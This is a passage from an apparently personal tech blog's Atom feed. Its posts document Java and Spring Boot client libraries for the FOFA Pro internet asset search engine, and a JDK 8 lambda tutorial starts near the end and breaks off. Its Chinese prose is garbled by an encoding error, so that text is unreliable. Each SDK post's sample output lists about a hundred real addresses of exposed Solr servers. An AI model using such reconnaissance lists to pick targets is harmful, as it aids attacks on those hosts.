class="comment">//img.shields.io/maven-central/v/com.r4v3zn.fofa/fofa-spring-boot-starter.svg?label=Maven%20Central)](https://search.maven.org/search?q=g:%22com.r4v3zn.fofa%22%20AND%20a:%22fofa-spring-boot-starter%22)</span></span><br></pre></td></tr></table></figure><h3 id="PURL"><a href="#PURL" class="headerlink" title="PURL"></a>PURL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg:maven/com.r4v3zn.fofa/fofa-spring-boot-starter@<span class="number">1.0</span>.0</span><br></pre></td></tr></table></figure><h3 id="Bazel"><a href="#Bazel" class="headerlink" title="Bazel"></a>Bazel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maven_jar(</span><br><span class="line">    name = <span class="string">"fofa-spring-boot-starter"</span>,</span><br><span class="line">    artifact = <span class="string">"com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0"</span>,</span><br><span class="line">    sha1 = <span class="string">"41b8264a15fcd137652d5194603ee4ce661d55e0"</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><table><thead><tr><th style="text-align:center">å­—æ®µåç§°</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center"><code>email</code></td><td style="text-align:center">ç”¨æˆ·ç™»é™† <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> ä½¿ç”¨çš„ <code>Email</code></td></tr><tr><td style="text-align:center"><code>key</code></td><td style="text-align:center">å‰å¾€ <a href="https://fofa.so/user/users/info" target="_blank" rel="noopener"><code>ä¸ªäººä¸­å¿ƒ</code></a> æŸ¥çœ‹ <code>API Key</code></td></tr></tbody></table><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>éœ€è¦é…ç½®é¡¹ç›®ä¸­çš„<code>application.yml</code>æˆ–<code>application.properties</code>æ–‡ä»¶ã€‚</p><h4 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fofa:</span></span><br><span class="line"><span class="attr">  email:</span> </span><br><span class="line"><span class="attr">  key:</span></span><br></pre></td></tr></table></figure><h4 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofa.email=</span><br><span class="line">fofa.key=</span><br></pre></td></tr></table></figure><h3 id="è·å–ç”¨æˆ·ä¿¡æ¯"><a href="#è·å–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç”¨æˆ·ä¿¡æ¯"></a>è·å–ç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> FofaClient client;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(client.getUser());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è·å–FOFA-Pro-æœç´¢ç»“æœ"><a href="#è·å–FOFA-Pro-æœç´¢ç»“æœ" class="headerlink" title="è·å–FOFA Pro æœç´¢ç»“æœ"></a>è·å–FOFA Pro æœç´¢ç»“æœ</h3><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> FofaClient client;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String q = <span class="string">"app=\"Solr\""</span>;</span><br><span class="line">    System.out.println(client.getData(q));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FofaData&#123;mode=<span class="string">'extended'</span>, page=<span class="number">1</span>, size=<span class="number">8578</span>, totalPage=<span class="number">86</span>, query=<span class="string">'app="Solr"'</span>, results=[<span class="number">52.204</span>.201.10:<span class="number">8080</span>, <span class="number">39.106</span>.133.253:<span class="number">8081</span>, <span class="number">168.61</span>.45.247:<span class="number">3000</span>, <span class="number">185.145</span>.32.101:<span class="number">9090</span>, <span class="number">47.92</span>.153.193:<span class="number">8083</span>, https:<span class="comment">//54.177.198.16:9443, https://46.137.115.176, 109.202.145.150:9090, 18.229.36.175, https://52.65.18.222, 94.103.24.81, 128.119.168.198:8080, 45.56.107.121:8090, 159.65.33.96:8080, 165.28.246.132, 34.205.15.100:8080, 3.89.155.86, 101.200.142.15:8099, 45.56.91.166:8090, 107.21.102.229, 89.28.161.145:8083, 35.165.137.220, 162.243.2.73:32768, 3.82.255.95:8080, 52.22.6.26, 96.126.97.74:8090, https://solr.swoonery.com, 63.34.225.181:8083, 18.223.238.90:7777, 167.99.252.65:8081, 18.232.114.197, 96.126.104.116:8090, 52.17.255.254, 101.201.145.141:8888, 13.228.98.189, 52.66.197.212:8081, 34.226.45.218:9443, 36.111.196.193:8082, 52.80.87.182, 97.107.133.44:8090, 173.255.217.135:8080, 34.199.97.120:8081, 52.17.131.156, https://13.55.200.182:443, 23.23.104.210, 54.68.95.160, https://54.77.13.29:8082, 66.175.209.109:8090, 52.200.107.211:8080, 104.130.124.46:7777, 192.231.177.172:8090, 54.221.155.2, 203.135.191.199:8080, 218.93.127.8:9080, 101.251.241.194:8081, 115.79.204.120:8888, 39.106.23.13:8180, https://52.16.231.131:8080, 52.5.53.165:8080, 39.106.180.220:8180, 52.67.86.138, https://52.26.130.143, 52.37.105.68, 23.239.19.16:8090, 52.58.193.2, 168.218.15.134, 52.44.108.125:9443, 76.210.250.82:32768, 52.71.163.53, 92.243.20.10:8080, 157.249.39.129, www.marineparts.us:8983, 185.135.12.139:8080, 123.207.239.114:8082, 66.175.209.253:8090, 66.175.209.38:8090, 173.255.223.210:8090, 14.29.118.239:20000, 70.142.24.61:8080, 3.87.173.6:8001, 47.107.106.243:20000, 101.201.117.191, 118.190.215.162, 116.203.141.150:8080, 58.250.149.11:8085, 3.88.123.255, 173.255.216.58:8090, 14.139.13.78:8080, 54.149.94.198, 142.93.183.248:8082, 216.47.157.209:8090, 202.202.240.113:7777, 198.101.238.25:8080, 52.66.72.8:8888, 92.243.20.10:8081, 23.239.23.20:8090, 39.107.94.23:8888, 79.137.82.228:8083, 120.55.191.189:8010, 52.21.16.23:8080]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h2><p>2019-06-17</p><pre><code>- å¼€æº</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å¼€æºåœ°å€&quot;&gt;&lt;a href=&quot;#å¼€æºåœ°å€&quot; class=&quot;headerlink&quot; title=&quot;å¼€æºåœ°å€&quot;&gt;&lt;/a&gt;å¼€æºåœ°å€&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/fofapro/fofa-spring-boot-starter&quot; 
      
    
    </summary>
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/categories/FOFA-Pro/"/>
    
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/tags/FOFA-Pro/"/>
    
      <category term="Spring Boot" scheme="http://www.r4v3zn.com/tags/Spring-Boot/"/>
    
      <category term="Java" scheme="http://www.r4v3zn.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>FOFA Pro java SDK</title>
    <link href="http://www.r4v3zn.com/posts/82f84ad1/"/>
    <id>http://www.r4v3zn.com/posts/82f84ad1/</id>
    <published>2019-06-17T08:13:18.000Z</published>
    <updated>2020-11-11T08:06:56.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¼€æºåœ°å€"><a href="#å¼€æºåœ°å€" class="headerlink" title="å¼€æºåœ°å€"></a>å¼€æºåœ°å€</h2><p><a href="https://github.com/fofapro/fofa-java" target="_blank" rel="noopener">https://github.com/fofapro/fofa-java</a></p><h2 id="FOFA-Pro-API"><a href="#FOFA-Pro-API" class="headerlink" title="FOFA Pro API"></a>FOFA Pro API</h2><p><a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> æ˜¯èµ„äº§æœç´¢å¼•æ“ <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> ä¸ºå¼€å‘è€…æä¾›çš„ <code>RESTful API</code> æ¥å£, å…è®¸å¼€å‘è€…åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­é›†æˆ <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> çš„åŠŸèƒ½ã€‚</p><h2 id="FOFA-SDK"><a href="#FOFA-SDK" class="headerlink" title="FOFA SDK"></a>FOFA SDK</h2><p>åŸºäº <a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> ç¼–å†™çš„ <code>java</code> ç‰ˆ <code>SDK</code>, æ–¹ä¾¿ java å¼€å‘è€…å¿«é€Ÿå°† <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> é›†æˆåˆ°è‡ªå·±çš„é¡¹ç›®ä¸­ã€‚</p><h2 id="æ·»åŠ ä¾èµ–"><a href="#æ·»åŠ ä¾èµ–" class="headerlink" title="æ·»åŠ ä¾èµ–"></a>æ·»åŠ ä¾èµ–</h2><h3 id="Apache-Maven"><a href="#Apache-Maven" class="headerlink" title="Apache Maven"></a>Apache Maven</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.r4v3zn.fofa&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;fofa-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="Gradle-Groovy-DSL"><a href="#Gradle-Groovy-DSL" class="headerlink" title="Gradle Groovy DSL"></a>Gradle Groovy DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">'com.r4v3zn.fofa:fofa-core:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Gradle-Kotlin-DSL"><a href="#Gradle-Kotlin-DSL" class="headerlink" title="Gradle Kotlin DSL"></a>Gradle Kotlin DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(<span class="string">"com.r4v3zn.fofa:fofa-core:1.0.0"</span>)</span><br></pre></td></tr></table></figure><h3 id="Scala-SBT"><a href="#Scala-SBT" class="headerlink" title="Scala SBT"></a>Scala SBT</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libraryDependencies += <span class="string">"com.r4v3zn.fofa"</span> % <span class="string">"fofa-core"</span> % <span class="string">"1.0.0"</span></span><br></pre></td></tr></table></figure><h3 id="Apache-Ivy"><a href="#Apache-Ivy" class="headerlink" title="Apache Ivy"></a>Apache Ivy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency org=<span class="string">"com.r4v3zn.fofa"</span> name=<span class="string">"fofa-core"</span> rev=<span class="string">"1.0.0"</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="Groovy-Grape"><a href="#Groovy-Grape" class="headerlink" title="Groovy Grape"></a>Groovy Grape</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Grapes</span>(</span><br><span class="line">  <span class="meta">@Grab</span>(group=<span class="string">'com.r4v3zn.fofa'</span>, <span class="keyword">module</span>=<span class="string">'fofa-core'</span>, version=<span class="string">'1.0.0'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Leiningen"><a href="#Leiningen" class="headerlink" title="Leiningen"></a>Leiningen</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[com.r4v3zn.fofa/fofa-core <span class="string">"1.0.0"</span>]</span><br></pre></td></tr></table></figure><h3 id="Apache-Buildr"><a href="#Apache-Buildr" class="headerlink" title="Apache Buildr"></a>Apache Buildr</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'com.r4v3zn.fofa:fofa-core:jar:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Maven-Central-Badge"><a href="#Maven-Central-Badge" class="headerlink" title="Maven Central Badge"></a>Maven Central Badge</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![Maven Central](https:<span class="comment">//img.shields.io/maven-central/v/com.r4v3zn.fofa/fofa-core.svg?label=Maven%20Central)](https://search.maven.org/search?q=g:%22com.r4v3zn.fofa%22%20AND%20a:%22fofa-core%22)</span></span><br></pre></td></tr></table></figure><h3 id="PURL"><a href="#PURL" class="headerlink" title="PURL"></a>PURL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg:maven/com.r4v3zn.fofa/fofa-core@<span class="number">1.0</span>.0</span><br></pre></td></tr></table></figure><h3 id="Bazel"><a href="#Bazel" class="headerlink" title="Bazel"></a>Bazel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maven_jar(</span><br><span class="line">    name = <span class="string">"fofa-core"</span>,</span><br><span class="line">    artifact = <span class="string">"com.r4v3zn.fofa:fofa-core:1.0.0"</span>,</span><br><span class="line">    sha1 = <span class="string">"93b888a1d1c42c696f60f246585609d66f72eb8b"</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><table><thead><tr><th style="text-align:center">å­—æ®µåç§°</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center"><code>email</code></td><td style="text-align:center">ç”¨æˆ·ç™»é™† <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> ä½¿ç”¨çš„ <code>Email</code></td></tr><tr><td style="text-align:center"><code>key</code></td><td style="text-align:center">å‰å¾€ <a href="https://fofa.so/user/users/info" target="_blank" rel="noopener"><code>ä¸ªäººä¸­å¿ƒ</code></a> æŸ¥çœ‹ <code>API Key</code></td></tr></tbody></table><h3 id="è·å–ç”¨æˆ·ä¿¡æ¯"><a href="#è·å–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç”¨æˆ·ä¿¡æ¯"></a>è·å–ç”¨æˆ·ä¿¡æ¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// FOFA Pro email</span></span><br><span class="line">    String email = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// FOFA Pro key</span></span><br><span class="line">    String key = <span class="string">""</span>;</span><br><span class="line">    FofaClient client = <span class="keyword">new</span> FofaClient(email, key);</span><br><span class="line">    System.out.println(client.getUser());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è·å–FOFA-Pro-æœç´¢ç»“æœ"><a href="#è·å–FOFA-Pro-æœç´¢ç»“æœ" class="headerlink" title="è·å–FOFA Pro æœç´¢ç»“æœ"></a>è·å–FOFA Pro æœç´¢ç»“æœ</h3><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// FOFA Pro email</span></span><br><span class="line">    String email = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// FOFA Pro key</span></span><br><span class="line">    String key = <span class="string">""</span>;</span><br><span class="line">    String q = <span class="string">"app=\"Solr\""</span>;</span><br><span class="line">    FofaClient client = <span class="keyword">new</span> FofaClient(email, key);</span><br><span class="line">    System.out.println(client.getData(q));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FofaData&#123;mode=<span class="string">'extended'</span>, page=<span class="number">1</span>, size=<span class="number">8578</span>, totalPage=<span class="number">86</span>, query=<span class="string">'app="Solr"'</span>, results=[<span class="number">52.204</span>.201.10:<span class="number">8080</span>, <span class="number">39.106</span>.133.253:<span class="number">8081</span>, <span class="number">168.61</span>.45.247:<span class="number">3000</span>, <span class="number">185.145</span>.32.101:<span class="number">9090</span>, <span class="number">47.92</span>.153.193:<span class="number">8083</span>, https:<span class="comment">//54.177.198.16:9443, https://46.137.115.176, 109.202.145.150:9090, 18.229.36.175, https://52.65.18.222, 94.103.24.81, 128.119.168.198:8080, 45.56.107.121:8090, 159.65.33.96:8080, 165.28.246.132, 34.205.15.100:8080, 3.89.155.86, 101.200.142.15:8099, 45.56.91.166:8090, 107.21.102.229, 89.28.161.145:8083, 35.165.137.220, 162.243.2.73:32768, 3.82.255.95:8080, 52.22.6.26, 96.126.97.74:8090, https://solr.swoonery.com, 63.34.225.181:8083, 18.223.238.90:7777, 167.99.252.65:8081, 18.232.114.197, 96.126.104.116:8090, 52.17.255.254, 101.201.145.141:8888, 13.228.98.189, 52.66.197.212:8081, 34.226.45.218:9443, 36.111.196.193:8082, 52.80.87.182, 97.107.133.44:8090, 173.255.217.135:8080, 34.199.97.120:8081, 52.17.131.156, https://13.55.200.182:443, 23.23.104.210, 54.68.95.160, https://54.77.13.29:8082, 66.175.209.109:8090, 52.200.107.211:8080, 104.130.124.46:7777, 192.231.177.172:8090, 54.221.155.2, 203.135.191.199:8080, 218.93.127.8:9080, 101.251.241.194:8081, 115.79.204.120:8888, 39.106.23.13:8180, https://52.16.231.131:8080, 52.5.53.165:8080, 39.106.180.220:8180, 52.67.86.138, https://52.26.130.143, 52.37.105.68, 23.239.19.16:8090, 52.58.193.2, 168.218.15.134, 52.44.108.125:9443, 76.210.250.82:32768, 52.71.163.53, 92.243.20.10:8080, 157.249.39.129, www.marineparts.us:8983, 185.135.12.139:8080, 123.207.239.114:8082, 66.175.209.253:8090, 66.175.209.38:8090, 173.255.223.210:8090, 14.29.118.239:20000, 70.142.24.61:8080, 3.87.173.6:8001, 47.107.106.243:20000, 101.201.117.191, 118.190.215.162, 116.203.141.150:8080, 58.250.149.11:8085, 3.88.123.255, 173.255.216.58:8090, 14.139.13.78:8080, 54.149.94.198, 142.93.183.248:8082, 216.47.157.209:8090, 202.202.240.113:7777, 198.101.238.25:8080, 52.66.72.8:8888, 92.243.20.10:8081, 23.239.23.20:8090, 39.107.94.23:8888, 79.137.82.228:8083, 120.55.191.189:8010, 52.21.16.23:8080]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h2><p>2019-06-12</p><pre><code>- æ·»åŠ ä¸­æ–‡æ–‡æ¡£</code></pre><p>2019-06-11</p><pre><code>- ä¿®æ”¹å¼€å‘è€…ä¿¡æ¯- åˆ é™¤hutool-httpä¾èµ–</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å¼€æºåœ°å€&quot;&gt;&lt;a href=&quot;#å¼€æºåœ°å€&quot; class=&quot;headerlink&quot; title=&quot;å¼€æºåœ°å€&quot;&gt;&lt;/a&gt;å¼€æºåœ°å€&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/fofapro/fofa-java&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/categories/FOFA-Pro/"/>
    
    
      <category term="FOFA Pro" scheme="http://www.r4v3zn.com/tags/FOFA-Pro/"/>
    
      <category term="Java" scheme="http://www.r4v3zn.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JDK8å‡½æ•°ç¼–ç¨‹</title>
    <link href="http://www.r4v3zn.com/posts/289368c1/"/>
    <id>http://www.r4v3zn.com/posts/289368c1/</id>
    <published>2019-04-23T08:14:01.000Z</published>
    <updated>2020-11-11T08:06:56.103Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Lambda"><a href="#ä»€ä¹ˆæ˜¯Lambda" class="headerlink" title="ä»€ä¹ˆæ˜¯Lambda"></a>ä»€ä¹ˆæ˜¯Lambda</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äºä¸€ä¸ªJavaå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥èµ‹ç»™å…¶ä¸€ä¸ªâ€œå€¼â€ã€‚</p><p><img src="https://img.zhiiyun.com/v2-ab6545c49383236a4af3f28a47886090_hd.jpg" alt=""></p><p>å¦‚æœä½ æƒ³æŠŠâ€œä¸€å—ä»£ç â€èµ‹ç»™ä¸€ä¸ªJavaå˜é‡ï¼Œåº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p><p>æ¯”å¦‚ï¼Œæˆ‘æƒ³æŠŠå³è¾¹é‚£å—ä»£ç ï¼Œèµ‹ç»™ä¸€ä¸ªå«åšaBlockOfCodeçš„Javaå˜é‡ï¼š</p><p><img src="https://img.zhiiyun.com/v2-1cc87e82fba0872c2cae3fee08e8fe41_hd.jpg" alt=""></p><p>åœ¨Java 8ä¹‹å‰ï¼Œè¿™ä¸ªæ˜¯åšä¸åˆ°çš„ã€‚ä½†æ˜¯Java 8é—®ä¸–ä¹‹åï¼Œåˆ©ç”¨Lambdaç‰¹æ€§ï¼Œå°±å¯ä»¥åšåˆ°äº†ã€‚</p><p><img src="https://img.zhiiyun.com/v2-145a556d86806c3163391a13428e3f03_hd.jpg" alt=""></p><p>å½“ç„¶ï¼Œè¿™ä¸ªå¹¶ä¸æ˜¯ä¸€ä¸ªå¾ˆç®€æ´çš„å†™æ³•ã€‚æ‰€ä»¥ï¼Œä¸ºäº†ä½¿è¿™ä¸ªèµ‹å€¼æ“ä½œæ›´åŠ elegant, æˆ‘ä»¬å¯ä»¥ç§»é™¤ä¸€äº›æ²¡ç”¨çš„å£°æ˜ã€‚</p><p><img src="https://img.zhiiyun.com/v2-a712753b42972e094a548ae02fa82987_hd.jpg" alt=""></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„éå¸¸ä¼˜é›…çš„æŠŠâ€œä¸€å—ä»£ç â€èµ‹ç»™äº†ä¸€ä¸ªå˜é‡ã€‚è€Œâ€œè¿™å—ä»£ç â€ï¼Œæˆ–è€…è¯´â€œè¿™ä¸ªè¢«èµ‹ç»™ä¸€ä¸ªå˜é‡çš„å‡½æ•°â€ï¼Œå°±æ˜¯ä¸€ä¸ªLambdaè¡¨è¾¾å¼ã€‚ä½†æ˜¯è¿™é‡Œä»ç„¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å˜é‡aBlockOfCodeçš„ç±»å‹åº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿåœ¨Java 8é‡Œé¢ï¼Œæ‰€æœ‰çš„Lambdaçš„ç±»å‹éƒ½æ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€ŒLambdaè¡¨è¾¾å¼æœ¬èº«ï¼Œä¹Ÿå°±æ˜¯â€é‚£æ®µä»£ç â€œï¼Œéœ€è¦æ˜¯è¿™ä¸ªæ¥å£çš„å®ç°ã€‚è¿™æ˜¯æˆ‘è®¤ä¸ºç†è§£Lambdaçš„ä¸€ä¸ªå…³é”®æ‰€åœ¨ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯ï¼ŒLambdaè¡¨è¾¾å¼æœ¬èº«å°±æ˜¯ä¸€ä¸ªæ¥å£çš„å®ç°ã€‚ç›´æ¥è¿™æ ·è¯´å¯èƒ½è¿˜æ˜¯æœ‰ç‚¹è®©äººå›°æ‰°ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹çœ‹ä¾‹å­ã€‚æˆ‘ä»¬ç»™ä¸Šé¢çš„aBlockOfCodeåŠ ä¸Šä¸€ä¸ªç±»å‹ï¼š</p><p><img src="https://img.zhiiyun.com/v2-55de66060b4cb70193ddc7fea201b257_hd.jpg" alt=""></p><p>è¿™ç§åªæœ‰ä¸€ä¸ªæ¥å£å‡½æ•°éœ€è¦è¢«å®ç°çš„æ¥å£ç±»å‹ï¼Œæˆ‘ä»¬å«å®ƒâ€å‡½æ•°å¼æ¥å£â€œã€‚ä¸ºäº†é¿å…åæ¥çš„äººåœ¨è¿™ä¸ªæ¥å£ä¸­å¢åŠ æ¥å£å‡½æ•°å¯¼è‡´å…¶æœ‰å¤šä¸ªæ¥å£å‡½æ•°éœ€è¦è¢«å®ç°ï¼Œå˜æˆâ€éå‡½æ•°æ¥å£â€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªä¸Šé¢åŠ ä¸Šä¸€ä¸ªå£°æ˜@FunctionalInterface, è¿™æ ·åˆ«äººå°±æ— æ³•åœ¨é‡Œé¢æ·»åŠ æ–°çš„æ¥å£å‡½æ•°äº†ï¼š</p><p><img src="https://img.zhiiyun.com/v2-2c57e7411de227d1eb09c327d01fb766_hd.jpg" alt=""></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„Lambdaè¡¨è¾¾å¼å£°æ˜ï¼š</p><p><img src="https://img.zhiiyun.com/v2-02eedc528fcee115f5ed0b7b045846d7_hd.jpg" alt=""></p><h2 id="Lambdaè¡¨è¾¾å¼æœ‰ä»€ä¹ˆä½œç”¨"><a href="#Lambdaè¡¨è¾¾å¼æœ‰ä»€ä¹ˆä½œç”¨" class="headerlink" title="Lambdaè¡¨è¾¾å¼æœ‰ä»€ä¹ˆä½œç”¨?"></a>Lambdaè¡¨è¾¾å¼æœ‰ä»€ä¹ˆä½œç”¨?</h2><p>æœ€ç›´è§‚çš„ä½œç”¨å°±æ˜¯ä½¿å¾—ä»£ç å˜å¾—å¼‚å¸¸ç®€æ´ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹Lambdaè¡¨è¾¾å¼å’Œä¼ ç»Ÿçš„Javaå¯¹åŒä¸€ä¸ªæ¥å£çš„å®ç°ï¼š</p><p><img src="https://img.zhiiyun.com/v2-dbd46cf9d188d0fde25db700c23dcc79_hd.jpg" alt=""></p><p>è¿™ä¸¤ç§å†™æ³•æœ¬è´¨ä¸Šæ˜¯ç­‰ä»·çš„ã€‚ä½†æ˜¯æ˜¾ç„¶ï¼ŒJava 8ä¸­çš„å†™æ³•æ›´åŠ 